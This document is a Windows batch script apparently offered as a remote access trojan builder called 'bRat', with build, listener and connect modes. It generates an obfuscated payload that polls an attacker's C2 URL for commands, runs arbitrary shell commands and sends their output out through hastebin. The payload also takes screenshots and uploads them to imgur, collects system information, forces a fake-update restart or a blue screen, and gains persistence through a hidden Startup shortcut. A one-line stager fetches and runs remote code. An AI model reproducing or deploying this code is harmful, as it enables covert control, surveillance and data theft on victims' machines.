@echo off
:: rBat by: ImaDoxer (instagram: carlkoors)
::
:Colors
	set blank=[30m
	set red=[91m
	set green=[92m
	set cyan=[96m
	set magenta=[95m
	set yellow=[93m
	set blue=[94m
	set white=[97m
	set grey=[90m
:: Create cool splashscreen
if "%1"=="" goto noargs
if "%1"=="Listen" goto List
if "%1"=="Build" goto Build
if "%1"=="Connect" goto Connect

:noargs
	echo %white%[%red%error%white%] %magenta%=^> %white%you must provide arguments ie:
	echo.
	echo %green%Build %yellow%- %green%Builds the payload for clients.
	echo %green%Listen %yellow%- %green%Listens on specific API url.
	echo %green%Connect %yellow%- %green%Connect to specific user. %white%
	goto :EOF

:Build
	cd "%USERPROFILE%"
	::Generate Randomness
	set ID=a%random%
	set exl=!
	set IP=a%random%
	set URL=a%random%
	set LOG=a%random%
	set txt=a%random%
	set Shellv2=a%random%
	set L=a%random%
	set nxt=a%random%
	set c2=a%random%
	set rand=a%random%
	set conf=a%random%
	set core=a%random%
	set vbs=a%random%
	:: get c2c url
	echo %green%Please specify the C2C URL
	echo with the api code -available on github
	echo %yellow%recommended to use 000webhost.
	echo %red%Example%white%: %green% http(s)://example.000webhostapp.com/
	echo %red%note%white%: %red%YOU MUST INCLUDE the '/' at the end. 
	set /p U="%white%[%red%API%magenta%-%red%URL%white%] %grey%> %white%"
	echo %green%Please specify the payload URL
	echo %yellow%recommended to use rentry.co
	echo %red%Example%white%: %green% http(s)://rentry.co/abc/raw
	echo %red%note%white%: %red%YOU MUST INCLUDE the '/raw' at the end. 
	set /p R1="%white%[%red%Payload%magenta%-%red%URL%white%] %grey%> %white%"
	echo %green%Please specify the stager URL
	echo %yellow%recommended to use rentry.co
	echo %red%Example%white%: %green% http(s)://rentry.co/abc/raw
	echo %red%note%white%: %red%YOU MUST INCLUDE the '/raw' at the end. 
	set /p R2="%white%[%red%Stager%magenta%-%red%URL%white%] %grey%> %white%"
	::Build Virus
	echo @echo off>payload.b
	echo ::bRat coder: ImaDoxer ^<- don't this malicously :(>>payload.b
	echo echo ::%%random%%%%random%%%%random%%::^>^>%%0>>payload.b
	echo echo ::%%random%%%%random%%%%random%%::^>^>%%0>>payload.b
	echo ::%random%%random%%random%%random%%random%::>>payload.b
	echo timeout /? ^>nul >>payload.b
	echo timeout 0 ^>nul >>payload.b
	echo timeout /? ^>nul >>payload.b
	echo timeout /? ^>nul >>payload.b
	echo timeout 0 ^>nul >>payload.b
	echo timeout 0 ^>nul >>payload.b
	echo timeout /? ^>nul >>payload.b
	echo timeout 0 ^>nul >>payload.b
	echo timeout /? ^>nul >>payload.b
	echo timeout 0 ^>nul >>payload.b
	echo timeout /? ^>nul >>payload.b
	echo timeout /? ^>nul >>payload.b
	echo timeout 0 ^>nul >>payload.b
	echo timeout 0 ^>nul >>payload.b
	echo timeout /? ^>nul >>payload.b
	echo timeout 0 ^>nul >>payload.b
	echo cd %%USERPROFILE%%>>payload.b
	echo SETLOCAL ENABLEDELAYEDEXPANSION>>payload.b
	echo ::%random%%random%%random%%random%%random%::>>payload.b
	echo ::%random%%random%%random%%random%%random%::>>payload.b
	echo ::%random%%random%%random%%random%%random%::>>payload.b
	echo ::%random%%random%%random%%random%%random%::>>payload.b
	echo ::%random%%random%%random%%random%%random%::>>payload.b
	echo ::%random%%random%%random%%random%%random%::>>payload.b
	echo ::%random%%random%%random%%random%%random%::>>payload.b
	echo FOR /F "tokens=* USEBACKQ" %%%%F IN (`curl -s api.ipify.org`) DO SET %IP%=%%%%F>>payload.b
	echo net session ^&^& if "%%errorlevel%%"=="0" if exist "%%SYSTEMROOT%%\System32\psexec.exe" (echo %%random%%) else (curl https://live.sysinternals.com/PsExec.exe --output %%SYSTEMROOT%%\System32\psexec.exe ^& psexec -accepteula ^>nul)>>payload.b
	echo SET %ID%=%%username%%~%%random%%>>payload.b
	echo set %URL%=%U%>>payload.b
	echo set %ID%=%%%ID%: =%%>>payload.b
	echo curl -s "%%%URL%%%api.php?cmd=%%%IP%%%:%%%ID%%%">>payload.b
	echo :%Shellv2%>>payload.b
	echo set %LOG%= >>payload.b
	echo set %txt%= >>payload.b
	echo timeout 4 ^>nul>>payload.b
	echo FOR /F "tokens=* USEBACKQ" %%%%F IN (`curl -s "%%%URL%%%server.log"`) DO SET %LOG%=%%%%F>>payload.b
	echo if "%%%LOG%%%"=="" goto %Shellv2% >>payload.b
	echo echo %%%LOG%%% ^| find "%%%ID%%%:" ^>nul>>payload.b
	echo if not "%%errorlevel%%"=="0" goto %Shellv2% >>payload.b
	echo set %LOG%=%exl%%LOG%:%%%ID%%%=%exl% >>payload.b
	echo set %LOG%=%%%LOG%:~1%% >>payload.b
	echo echo %%%LOG%%% ^| find "exit" ^>nul >>payload.b
	echo if "%%errorlevel%%"=="0" curl -s "%%%URL%%%api2.php" ^>nul ^& goto %Shellv2% >>payload.b
	echo curl -s "%%%URL%%%api2.php" ^>nul >>payload.b
	echo echo %%%LOG%%% ^| find "Say " ^>nul >>payload.b
	echo if "%%errorlevel%%"=="0" echo set s =createobject("sapi.spvoice")^>s.vbs^&echo s.speak "%%%LOG%:Say =%%" ^>^>s.vbs ^& wscript s.vbs ^& del /q s.vbs ^& curl -s "%%%URL%%%api2.php" ^>nul ^& goto %Shellv2% >>payload.b
	:: Modules
	echo echo %%%LOG%%% ^| find "Get-Screenshot" ^>nul >>payload.b
	echo if "%%errorlevel%%"=="0" powershell.exe "[Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");function screenshot([Drawing.Rectangle]$bounds, $path){$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;$graphics = [Drawing.Graphics]::FromImage($bmp);$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);$bmp.Save($path);$graphics.Dispose();$bmp.Dispose();};$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080);screenshot $bounds \"%%USERPROFILE%%\screenshot.png\";" ^& FOR /F "tokens=* USEBACKQ" %%%%F IN (`curl -X POST -H "Authorization: Bearer YOUR_ACCESS_TOKEN" -F "image=@%%USERPROFILE%%\screenshot.png" https://api.imgur.com/3/upload`) DO FOR /F "tokens=* USEBACKQ" %%%%B IN (`powershell "$s='%%%%F';$t=($s.split(':')[4]).split(',')[0];'https://i.imgur.com/'+$t+'.png'"`) DO set %txt%=%%%%B ^& goto %nxt%>>payload.b
	echo echo %%%LOG%%% ^| find "Timeout" ^>nul >>payload.b
	echo if "%%errorlevel%%"=="0" ipconfig /release ^& timeout 4 ^& ipconfig /renew ^& goto %Shellv2%>>payload.b
	echo echo %%%LOG%%% ^| find "Shutdown" ^>nul >>payload.b
	echo if "%%errorlevel%%"=="0" shutdown /r /t 02 /c "Windows has to restart for updates." ^& exit>>payload.b
	echo echo %%%LOG%%% ^| find "Get-Info" ^>nul >>payload.b
	echo if "%%errorlevel%%"=="0" systeminfo ^| find "Host Name" ^>out.put ^& systeminfo ^| find "OS Name" ^>^>out.put ^& echo Username:                  %%username%% ^>^>out.put ^& systeminfo ^| find "System Model" ^>^>out.put ^& systeminfo ^| find "Domain" ^>^>out.put ^& goto %nxt%>>payload.b
	echo echo %%%LOG%%% ^| find "BSOD" ^>nul >>payload.b
	echo if "%%errorlevel%%"=="0" taskkill /f /im wininit ^& powershell.exe wininit.exe ^& shutdown /r /t 00>>payload.b
	::Shell if not modules :)
	echo cmd /c "%%%LOG%%%"^>^>out.put>>payload.b
	echo :%nxt%>>payload.b
	echo for /F "tokens=*" %%%%F in (out.put) DO set %txt%=%exl%%txt%%exl%%%%%F-+>>payload.b
	echo FOR /F "tokens=* USEBACKQ" %%%%F IN (`curl -s https://hastebin.com/documents -d "%%%txt%%%"`) DO set %L%=%%%%F>>payload.b
	echo set %L%=%%%L%:^"=%% >>payload.b
	echo set %L%=%%%L%:{key:=%%>>payload.b
	echo set %L%=%%%L%:}=%%>>payload.b
	echo set %L%="%%%L%:-=%%">>payload.b
	echo curl -s %%%URL%%%api.php?cmd="%%%L%: =%%">>payload.b
	echo :%c2%>>payload.b
	echo set %LOG%=>>payload.b
	echo timeout 4 ^>nul>>payload.b
	echo FOR /F "tokens=* USEBACKQ" %%%%F IN (`curl -s "%%%URL%%%server.log"`) DO SET %LOG%=%%%%F>>payload.b
	echo if not "%%%LOG%%%"=="" goto %c2%>>payload.b
	echo del /q out.put>>payload.b
	echo goto %Shellv2%>>payload.b
	timeout 1 >nul
	echo %white%Paste this base64 on %red%%R1%!
	powershell [convert]::ToBase64String((Get-Content -path "payload.b" -Encoding byte))>p.b & del /q payload.b >nul& notepad p.b
	cls
	:: make a random directory.
	echo %green%mkdir "%%localappdata%%\%rand%"
	echo echo CreateObject("Wscript.Shell").Run """" ^^^& WScript.Arguments(0) ^^^& """", 0, True^>"%%localappdata%%\%rand%\%vbs%.vbs"
	echo curl %R1%^>"%%localappdata%%\%rand%\%core%.t"
	echo certutil -decode -f "%%localappdata%%\%rand%\%core%.t" "%%localappdata%%\%rand%\%core%.bat"
	echo del /q "%%localappdata%%\%rand%\%core%.t"
	echo powershell "$WshShell = New-Object -comObject WScript.Shell;$S = $WshShell.CreateShortcut('%%AppData%%\Microsoft\Windows\Start Menu\Programs\Startup\%random%.lnk');$S.TargetPath = '%%localappdata%%\%rand%\%vbs%.vbs';$S.Arguments = '%%localappdata%%\%rand%\%core%.bat';$S.Save()"
	echo ""%%localappdata%%\%rand%\%vbs%.vbs" "%%localappdata%%\%rand%\%core%.bat""
	echo %white%Please paste the code on %red%%R2%!
	pause
	cls
	echo %green%Congrats you just made a thing
	echo Stager cmd: cmd /c FOR /F "tokens=* USEBACKQ" %%F IN (`curl -s %R2%`) DO cmd /c %%F
	choice /c yn /m "Would you like to start the listener for %U%?"
	if %errorlevel%==1 (cls & goto List)
	if %errorlevel%==2 (goto :EOF)

:List
	SETLOCAL ENABLEDELAYEDEXPANSION
	echo %blank%.%white%
	cls
	if not "%U%"=="" echo %red%Listening%white% &goto Listen 
	set /p U="%white%[%red%API%magenta%-%red%URL%white%] %grey%>%white% "
	choice /c yn /m "Would you like Auto Connect (Rshell)?"
	if "%errorlevel%"=="1" set autoconnect=1 & cls & echo %red%Listening%white%
	if "%errorlevel%"=="2" echo %white%ok. Inorder to connect you need to use %red%bRat %blue%Connect %yellow%IP %magenta%ID %green%URL & set autoconnect=2
	:Listen
		set id=
		FOR /F "tokens=* USEBACKQ" %%F IN (`curl -s "%U%server.log"`) DO set id=%%F
		if "!id!"=="" timeout 10 >nul && goto Listen
		echo !id! | find "." >nul
		if "!errorlevel!"=="1" goto Listen
		FOR /F "tokens=* USEBACKQ" %%F IN (`powershell "$s='!id!';$s.split(':')[0];"`) DO SET IP=%%F
		FOR /F "tokens=* USEBACKQ" %%B IN (`powershell "$s='!id!';$s.split(':')[1];"`) DO SET ID=%%B
		if not %IP%=="" (echo %white%[%red%%IP%%white%] %blue%%ID%%green% has connected.%white%) else (curl -s %U%/api2.php >nul & goto Listen)
		if %autoconnect%==1 (start cmd /c "%0 Connect %IP% %ID% %U%" & curl -s "%U%api2.php" >nul &goto Listen)
		if %autoconnect%==2 (curl -s %URL%api2.php >nul & goto Listen)
:Connect
	SETLOCAL ENABLEDELAYEDEXPANSION
	set URL=%4
	set /p cmd="%white%[%red%%2%white% \ %blue%%3%white%] %magenta%> %white%"
	set cmd=!cmd: =%%20!
	set cmd=!cmd:(=%%28!
	set cmd=!cmd:)=%%29!
	set cmd=!cmd:^&=%%26!
	set cmd=!cmd:^<=%%3C!
	set cmd=!cmd:^>=%%3E!
	if "!cmd!"=="help" echo %white%[%red%bRat %white%\ %blue%Internal%white%] %magenta% ^> %white%help & echo %green%Get-Screenshot %magenta% -  %green%Takes screenshot (imgur). & echo %green%Get-Info %magenta%       -  %green%Returns info about computer (AV's, installed progs, etc). & echo %green%Shutdown %magenta%       -  %green%Restarts PC with fake prompt (will terminate shell). & echo %green%Timeout %magenta%        -  %green%Disables the internet for 3-5 seconds. & echo %green%Say {phrase}%magenta%    -  %green%Talks (vb-script) & echo %red%BSOD %magenta%           -  %green%Forces a blue screen (non-admin).& goto Connect
	curl "%URL%api.php?cmd=%3:!cmd!"
	echo !cmd! | find "Say" >nul
	if %errorlevel%==0 goto Connect
	if "!cmd!"=="Timeout" goto Connect
	if "!cmd!"=="Shutdown" echo %white%[%red%%2%white% \ %blue%%3] %magenta%^> %white%Connection Terminated %magenta%^< & timeout 3 >nul & exit
	if "!cmd!"=="BSOD" echo %white%[%red%%2%white% \ %blue%%3] %magenta%^> %white%Connection Terminated %magenta%^< & timeout 3 >nul & exit
	timeout /nobreak 7 >nul
	:cha
		set id.old=!id!
		FOR /F "tokens=* USEBACKQ" %%F IN (`curl -s %U%server.log`) DO set id=%%F
		if "!id!"=="!id.old!" timeout 4 >nul && goto cha
		curl "%U%api2.php" >nul
		set id=!id:"=!
		FOR /F "tokens=* USEBACKQ" %%F IN (`curl -s https://hastebin.com/raw/!id!`) DO if "!cmd!"=="Get-Screenshot" (start %%F & set id.old=!id! & goto Connect) else (powershell "$s='%%F';$t=$s.Split('+');$t -replace \".$\";")
		set id.old=!id!
		SET id=
		goto connect